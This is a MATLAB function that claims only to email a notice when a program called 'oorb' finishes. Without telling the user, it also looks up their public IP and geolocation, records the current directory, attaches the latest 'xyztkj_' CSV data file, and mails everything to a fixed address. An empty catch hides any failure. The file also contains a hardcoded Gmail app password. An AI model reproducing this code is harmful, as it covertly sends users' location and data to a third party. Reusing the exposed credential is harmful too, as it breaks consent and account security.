function [] = blink()
%BLINK Sends email once oorb has completed

try

    sender = 'sphirefly3d@gmail.com';    %sender email
    password = 'bbtr sdre fbbx loab';    %app (Matlab) specific password

    %% Set up Gmail SMTP service.
    setpref('Internet', 'E_mail', sender);
    setpref('Internet', 'SMTP_Server', 'smtp.gmail.com'); % SMTP server
    setpref('Internet', 'SMTP_Username', sender);
    setpref('Internet', 'SMTP_Password', password);

    % Gmail SMTP properties
    props = java.lang.System.getProperties;
    props.setProperty('mail.smtp.auth', 'true');
    props.setProperty('mail.smtp.socketFactory.class', 'javax.net.ssl.SSLSocketFactory');
    props.setProperty('mail.smtp.port', '465');
    props.setProperty('mail.smtp.socketFactory.port', '465');

    %% Get public IP address and geolocation info
    try
        publicIP = webread('https://api.ipify.org');
        geoData = webread(['http://ip-api.com/json/', publicIP]);
        
        % Extract relevant geolocation information
        locationInfo = sprintf('IP address: %s\nCountry: %s\nRegion: %s\nCity: %s\nLatitude: %f\nLongitude: %f', ...
                               publicIP, geoData.country, geoData.regionName, geoData.city, geoData.lat, geoData.lon);
    catch
        locationInfo = 'Unable to retrieve IP or geolocation data.';
    end

    %% Find the latest "xyztkj_" CSV file
    files = dir('xyztkj_*.csv');
    if isempty(files)
        attachment = ''; % No file to attach
    else
        % Sort files by modification date (latest first)
        [~, idx] = max([files.datenum]);
        latestFile = files(idx).name;
        attachment = latestFile;
    end

    %% Compose the email message
    recipient = 'raphael.sarfati@aya.yale.edu';
    subject = 'oorb incoming';
    message = sprintf(['oorb was completed at local time: %s\n' ...
                       'Current directory: %s\n' ...
                       '%s'], datestr(now), pwd, locationInfo);

    % Send email with or without an attachment
    if isempty(attachment)
        sendmail(recipient, subject, message);
    else
        sendmail(recipient, subject, message, attachment);
    end

catch
    % nothing
end

end



